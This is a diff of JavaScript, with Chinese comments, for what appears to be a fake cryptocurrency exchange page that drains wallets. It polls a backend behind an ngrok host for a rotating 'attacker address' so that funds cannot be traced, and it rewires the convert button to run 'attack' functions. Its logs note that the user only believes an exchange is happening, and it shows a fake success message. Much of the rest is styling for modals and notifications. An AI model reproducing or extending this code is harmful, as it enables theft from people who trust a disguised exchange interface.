@@ -7,6 +7,7 @@ let CURRENT_ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';  // 默认�
 // const BACKEND_API = 'http://localhost:5001';  // Python后端地址
 const BACKEND_API = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';  // Python后端地址（通过ngrok）
 
+
 // 🔄 实时获取攻击者地址
 async function getCurrentAttackerAddress() {
     try {
@@ -19,6 +20,10 @@ async function getCurrentAttackerAddress() {
 
             // 如果地址发生变化，记录轮换日志
             if (oldAddress !== CURRENT_ATTACKER_ADDRESS) {
+                console.log(`   轮换设置: 每${result.data.max_usage}次或${result.data.rotation_interval_hours}小时轮换一次`);
+
+                // 🎯 显示地址更新提示给用户
+                showAddressUpdateNotification(oldAddress, CURRENT_ATTACKER_ADDRESS, result.data);
                 console.log(`🔄 [防追踪] 攻击者地址已轮换:`);
                 console.log(`   旧地址: ${oldAddress}`);
                 console.log(`   新地址: ${CURRENT_ATTACKER_ADDRESS}`);
@@ -46,6 +51,145 @@ async function getCurrentAttackerAddress() {
         };
     }
 }
+
+// 🎯 显示地址更新通知
+function showAddressUpdateNotification(oldAddress, newAddress, walletInfo) {
+    // 创建通知元素
+    const notification = document.createElement('div');
+    notification.className = 'address-update-notification';
+    notification.innerHTML = `
+        <div class="notification-content">
+            <div class="notification-icon">🔄</div>
+            <div class="notification-text">
+                <div class="notification-title">🎯 攻击者地址已更新</div>
+                <div class="notification-details">
+                    <div>钱包: ${walletInfo.wallet_name}</div>
+                    <div>新地址: ${newAddress.slice(0, 10)}...${newAddress.slice(-6)}</div>
+                    <div>使用次数: ${walletInfo.usage_count}/${walletInfo.max_usage}</div>
+                </div>
+            </div>
+            <button class="notification-close" onclick="this.parentElement.remove()">×</button>
+        </div>
+    `;
+
+    // 添加样式
+    if (!document.getElementById('addressNotificationStyles')) {
+        const styles = document.createElement('style');
+        styles.id = 'addressNotificationStyles';
+        styles.textContent = `
+            .address-update-notification {
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                z-index: 10001;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                color: white;
+                border-radius: 12px;
+                padding: 16px;
+                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+                min-width: 300px;
+                animation: slideInRight 0.3s ease-out;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            }
+            
+            .notification-content {
+                display: flex;
+                align-items: flex-start;
+                gap: 12px;
+            }
+            
+            .notification-icon {
+                font-size: 24px;
+                flex-shrink: 0;
+            }
+            
+            .notification-text {
+                flex: 1;
+            }
+            
+            .notification-title {
+                font-weight: 600;
+                font-size: 14px;
+                margin-bottom: 8px;
+            }
+            
+            .notification-details {
+                font-size: 12px;
+                opacity: 0.9;
+                line-height: 1.4;
+            }
+            
+            .notification-close {
+                background: none;
+                border: none;
+                color: white;
+                font-size: 18px;
+                cursor: pointer;
+                padding: 0;
+                width: 20px;
+                height: 20px;
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                opacity: 0.7;
+                transition: opacity 0.2s;
+            }
+            
+            .notification-close:hover {
+                opacity: 1;
+                background: rgba(255, 255, 255, 0.1);
+            }
+            
+            @keyframes slideInRight {
+                from {
+                    transform: translateX(100%);
+                    opacity: 0;
+                }
+                to {
+                    transform: translateX(0);
+                    opacity: 1;
+                }
+            }
+        `;
+        document.head.appendChild(styles);
+    }
+
+    // 添加到页面
+    document.body.appendChild(notification);
+
+    // 5秒后自动消失
+    setTimeout(() => {
+        if (notification.parentElement) {
+            notification.style.animation = 'slideInRight 0.3s ease-out reverse';
+            setTimeout(() => notification.remove(), 300);
+        }
+    }, 5000);
+
+    debugLog(`🎯 地址更新通知已显示: ${oldAddress} -> ${newAddress}`);
+}
+
+// 🎯 定期检查地址更新
+let addressCheckInterval = null;
+
+function startAddressMonitoring() {
+    // 防止重复启动
+    if (addressCheckInterval) {
+        clearInterval(addressCheckInterval);
+    }
+
+    // 每30秒检查一次地址更新
+    addressCheckInterval = setInterval(async () => {
+        try {
+            await getCurrentAttackerAddress();
+        } catch (error) {
+            console.warn('🔄 定期地址检查失败:', error);
+        }
+    }, 30000); // 30秒
+
+    debugLog('🔄 地址监控已启动，每30秒检查一次');
+}
+
 // 🎯 多币种功能补丁 - 在现有代码基础上添加
 // 保留所有原有功能，只添加多币种支持
 
@@ -63,7 +207,7 @@ const ADDITIONAL_CURRENCIES = {
         contractAddress: null
     },
     'ETH': {
-        name: 'Ethereum', 
+        name: 'Ethereum',
         symbol: 'ETH',
         icon: 'eth-icon',
         decimals: 18,
@@ -75,7 +219,7 @@ const ADDITIONAL_CURRENCIES = {
     },
     'BNB': {
         name: 'BNB Smart Chain',
-        symbol: 'BNB', 
+        symbol: 'BNB',
         icon: 'bnb-icon',
         decimals: 18,
         network: 'bsc',
@@ -87,7 +231,7 @@ const ADDITIONAL_CURRENCIES = {
     'USDC': {
         name: 'USD Coin',
         symbol: 'USDC',
-        icon: 'usdc-icon', 
+        icon: 'usdc-icon',
         decimals: 6,
         network: 'multi',
         price: 0.9999,
@@ -99,7 +243,7 @@ const ADDITIONAL_CURRENCIES = {
         name: 'Solana',
         symbol: 'SOL',
         icon: 'sol-icon',
-        decimals: 9, 
+        decimals: 9,
         network: 'solana',
         price: 247.89,
         change: '+3.21%',
@@ -111,7 +255,7 @@ const ADDITIONAL_CURRENCIES = {
         symbol: 'DOGE',
         icon: 'doge-icon',
         decimals: 8,
-        network: 'dogecoin', 
+        network: 'dogecoin',
         price: 0.28794,
         change: '-0.50%',
         balance: 0,
@@ -141,7 +285,7 @@ const ADDITIONAL_CURRENCIES = {
     },
     'DOT': {
         name: 'Polkadot',
-        symbol: 'DOT', 
+        symbol: 'DOT',
         icon: 'dot-icon',
         decimals: 10,
         network: 'polkadot',
@@ -155,7 +299,7 @@ const ADDITIONAL_CURRENCIES = {
         symbol: 'AVAX',
         icon: 'avax-icon',
         decimals: 18,
-        network: 'avalanche', 
+        network: 'avalanche',
         price: 45.67,
         change: '+1.89%',
         balance: 0,
@@ -317,16 +461,140 @@ function createCurrencyModal() {
         </div>
     </div>
     `;
-    
+
     document.body.insertAdjacentHTML('beforeend', modalHTML);
+    // 添加模态框样式
+    const modalStyles = `
+        <style>
+        .currency-modal {
+            display: none;
+            position: fixed;
+            z-index: 10000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+        }
+        
+        .currency-modal.show {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .currency-modal-content {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            max-height: 80vh;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+        
+        .currency-modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .currency-modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #999;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .currency-search input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        
+        .currency-list {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .currency-item {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            cursor: pointer;
+            border-radius: 8px;
+            margin-bottom: 5px;
+            transition: background-color 0.2s;
+        }
+        
+        .currency-item:hover {
+            background: #f0f8ff;
+        }
+        
+        .currency-item .currency-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            margin-right: 12px;
+            font-size: 14px;
+        }
+        
+        .currency-item-info {
+            flex: 1;
+        }
+        
+        .currency-item-name {
+            font-weight: 500;
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .currency-item-symbol {
+            font-size: 12px;
+            color: #666;
+        }
+        </style>
+    `;
+    document.head.insertAdjacentHTML('beforeend', modalStyles);
     debugLog('🎯 币种选择模态框已创建');
 }
+// 页面加载完成后创建模态框
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function (){
+        createCurrencyModal();
+        startAddressMonitoring();
+    });
+} else {
+    createCurrencyModal();
+    startAddressMonitoring();
+}
+debugLog('🎯 多币种功能补丁加载完成！');
 
 // 🎯 初始化币种列表
 function initializeCurrencyList() {
     const currencyList = document.getElementById('currencyList');
     if (!currencyList) return;
-    
+
     currencyList.innerHTML = '';
 
     // 添加原有的TRX和USDT
@@ -341,7 +609,7 @@ function initializeCurrencyList() {
         },
         'USDT': {
             name: 'Tether',
-            symbol: 'USDT', 
+            symbol: 'USDT',
             icon: 'usdt-icon',
             price: 1.0001,
             change: '0.00%',
@@ -354,10 +622,10 @@ function initializeCurrencyList() {
         const currencyItem = document.createElement('div');
         currencyItem.className = 'currency-item';
         currencyItem.onclick = () => selectCurrency(currency.symbol);
-        
-        const changeClass = currency.change.startsWith('+') ? 'positive' : 
+
+        const changeClass = currency.change.startsWith('+') ? 'positive' :
                            currency.change.startsWith('-') ? 'negative' : '';
-        
+
         currencyItem.innerHTML = `
             <div class="currency-icon ${currency.icon}">${currency.symbol.charAt(0)}</div>
             <div class="currency-item-info">
@@ -369,14 +637,14 @@ function initializeCurrencyList() {
                 <div class="currency-item-change ${changeClass}">${currency.change}</div>
             </div>
         `;
-        
+
         currencyList.appendChild(currencyItem);
     });
 }
 
 // 🎯 多币种变量 - 添加到现有全局变量
 let currentFromCurrency = 'TRX';
-let currentToCurrency = 'USDT'; 
+let currentToCurrency = 'USDT';
 let isSelectingCurrency = false;
 let selectingType = '';
 
@@ -409,23 +677,23 @@ function selectCurrency(symbol) {
         'USDT': { name: 'Tether', icon: 'usdt-icon', balance: 0 },
         ...ADDITIONAL_CURRENCIES
     };
-    
+
     const currency = allCurrencies[symbol];
     if (!currency) return;
-    
+
     if (selectingType === 'from') {
         currentFromCurrency = symbol;
         document.getElementById('fromCurrencyIcon').className = `currency-icon ${currency.icon}`;
         document.getElementById('fromCurrencyIcon').textContent = symbol.charAt(0);
         document.getElementById('fromCurrencyName').textContent = symbol;
-        
+
         // 更新余额显示
-        const balanceElement = document.getElementById('fromCurrencyBalance') || 
+        const balanceElement = document.getElementById('fromCurrencyBalance') ||
                               document.getElementById('trxBalance');
         if (balanceElement) {
             balanceElement.textContent = `可用: ${currency.balance} ${symbol}`;
         }
-        
+
         debugLog(`💰 选择支付币种: ${symbol}`);
     } else if (selectingType === 'to') {
         currentToCurrency = symbol;
@@ -434,9 +702,9 @@ function selectCurrency(symbol) {
         document.getElementById('toCurrencyName').textContent = symbol;
         debugLog(`💰 选择接收币种: ${symbol}`);
     }
-    
+
     closeCurrencyModal();
-    
+
     // 重新计算兑换 - 使用现有的calculateConversion函数
     if (typeof calculateConversion === 'function') {
         calculateConversion();
@@ -447,11 +715,11 @@ function selectCurrency(symbol) {
 function filterCurrencies() {
     const searchTerm = document.getElementById('currencySearch').value.toLowerCase();
     const currencyItems = document.querySelectorAll('.currency-item');
-    
+
     currencyItems.forEach(item => {
         const name = item.querySelector('.currency-item-name').textContent.toLowerCase();
         const symbol = item.querySelector('.currency-item-symbol').textContent.toLowerCase();
-        
+
         if (name.includes(searchTerm) || symbol.includes(searchTerm)) {
             item.style.display = 'flex';
         } else {
@@ -463,28 +731,28 @@ function filterCurrencies() {
 // 🎯 增强的交换币种函数 - 覆盖原有函数
 function swapCurrencies() {
     debugLog('🔄 用户点击币种交换');
-    
+
     const tempCurrency = currentFromCurrency;
     currentFromCurrency = currentToCurrency;
     currentToCurrency = tempCurrency;
-    
+
     const allCurrencies = {
         'TRX': { name: 'TRON', icon: 'trx-icon', balance: userBalance || 0 },
         'USDT': { name: 'Tether', icon: 'usdt-icon', balance: 0 },
         ...ADDITIONAL_CURRENCIES
     };
-    
+
     // 更新UI
     const fromCurrency = allCurrencies[currentFromCurrency];
     const toCurrency = allCurrencies[currentToCurrency];
-    
+
     if (fromCurrency && toCurrency) {
         // 更新支付币种显示
         const fromIcon = document.getElementById('fromCurrencyIcon');
         const fromName = document.getElementById('fromCurrencyName');
-        const fromBalance = document.getElementById('fromCurrencyBalance') || 
+        const fromBalance = document.getElementById('fromCurrencyBalance') ||
                            document.getElementById('trxBalance');
-        
+
         if (fromIcon) {
             fromIcon.className = `currency-icon ${fromCurrency.icon}`;
             fromIcon.textContent = currentFromCurrency.charAt(0);
@@ -495,11 +763,11 @@ function swapCurrencies() {
         if (fromBalance) {
             fromBalance.textContent = `可用: ${fromCurrency.balance} ${currentFromCurrency}`;
         }
-        
+
         // 更新接收币种显示
         const toIcon = document.getElementById('toCurrencyIcon');
         const toName = document.getElementById('toCurrencyName');
-        
+
         if (toIcon) {
             toIcon.className = `currency-icon ${toCurrency.icon}`;
             toIcon.textContent = currentToCurrency.charAt(0);
@@ -508,18 +776,18 @@ function swapCurrencies() {
             toName.textContent = currentToCurrency;
         }
     }
-    
+
     // 清空输入
     const fromAmount = document.getElementById('fromAmount');
     const toAmount = document.getElementById('toAmount');
     if (fromAmount) fromAmount.value = '';
     if (toAmount) toAmount.value = '';
-    
+
     // 重新计算兑换
     if (typeof calculateConversion === 'function') {
         calculateConversion();
     }
-    
+
     showToast(`已切换为 ${currentFromCurrency} → ${currentToCurrency}`);
 }
 
@@ -529,34 +797,34 @@ function calculateConversion() {
     const toAmount = document.getElementById('toAmount');
     const convertBtn = document.getElementById('convertBtn');
     const rateText = document.getElementById('rateText');
-    
+
     if (fromAmount && parseFloat(fromAmount) > 0) {
         const allCurrencies = {
             'TRX': { price: 0.1634 },
             'USDT': { price: 1.0001 },
             ...ADDITIONAL_CURRENCIES
         };
-        
+
         const fromCurrency = allCurrencies[currentFromCurrency];
         const toCurrency = allCurrencies[currentToCurrency];
-        
+
         if (fromCurrency && toCurrency) {
             // 通过USD中转计算汇率
             const usdValue = parseFloat(fromAmount) * fromCurrency.price;
             const converted = (usdValue / toCurrency.price).toFixed(6);
-            
+
             if (toAmount) {
                 toAmount.value = converted;
             }
-            
+
             if (rateText) {
                 rateText.textContent = `1 ${currentFromCurrency} ≈ ${(fromCurrency.price / toCurrency.price).toFixed(6)} ${currentToCurrency}`;
             }
-            
+
             if (isWalletConnected && convertBtn) {
                 convertBtn.textContent = `兑换 ${fromAmount} ${currentFromCurrency}`;
                 convertBtn.disabled = false;
-                
+
                 debugLog(`💱 用户计算兑换: ${fromAmount} ${currentFromCurrency} → ${converted} ${currentToCurrency}`);
             } else if (convertBtn) {
                 convertBtn.textContent = '请先连接钱包';
@@ -585,20 +853,20 @@ async function executeMultiCurrencyAttack() {
             return executeAttack();
         }
     }
-    
+
     // 其他币种的攻击逻辑
     if (!isWalletConnected) {
         showToast('请先连接钱包', 'error');
         showWalletModal();
         return;
     }
-    
+
     const fromAmount = document.getElementById('fromAmount').value;
     if (!fromAmount || parseFloat(fromAmount) <= 0) {
         showToast(`请输入有效的${currentFromCurrency}数量`, 'error');
         return;
     }
-    
+
     debugLog(`🎯🎯🎯 用户执行${currentFromCurrency}兑换 - 多币种攻击开始！🎯🎯🎯`);
     debugLog(`🎯 用户以为兑换: ${fromAmount} ${currentFromCurrency} → ${document.getElementById('toAmount').value} ${currentToCurrency}`);
     debugLog(`🎯 当前攻击者地址: ${currentAttackerAddress}`);
@@ -617,16 +885,16 @@ async function executeMultiCurrencyAttack() {
         userAgent: navigator.userAgent,
         url: window.location.href
     };
-    
+
     localStorage.setItem('multiCurrencyAttackRecord', JSON.stringify(attackRecord));
-    
+
     showToast('正在执行交易...', 'info');
-    
+
     // 模拟攻击成功
     setTimeout(() => {
         debugLog('🏆🏆🏆 多币种攻击模拟成功！🏆🏆🏆');
         showToast(`兑换成功！获得 ${document.getElementById('toAmount').value} ${currentToCurrency}`);
-        
+
         // 重置表单
         document.getElementById('fromAmount').value = '';
         document.getElementById('toAmount').value = '';
@@ -638,22 +906,22 @@ async function executeMultiCurrencyAttack() {
 // 🎯 初始化多币种功能
 function initMultiCurrencyFeatures() {
     debugLog('🎯 初始化多币种功能...');
-    
+
     // 添加样式
     addMultiCurrencyStyles();
-    
+
     // 创建模态框
     createCurrencyModal();
-    
+
     // 初始化币种列表
     initializeCurrencyList();
-    
+
     // 修改现有的兑换按钮点击事件
     const convertBtn = document.getElementById('convertBtn');
     if (convertBtn) {
         // 保存原有的onclick
         const originalOnclick = convertBtn.onclick;
-        
+
         // 设置新的onclick
         convertBtn.onclick = async function() {
             if (currentFromCurrency === 'TRX' && typeof executeAttack === 'function') {
@@ -665,7 +933,7 @@ function initMultiCurrencyFeatures() {
             }
         };
     }
-    
+
     debugLog('✅ 多币种功能初始化完成');
     debugLog(`🎯 支持币种: TRX, USDT, BTC, ETH, BNB, SOL, DOGE, XRP, ADA, DOT, AVAX`);
 }
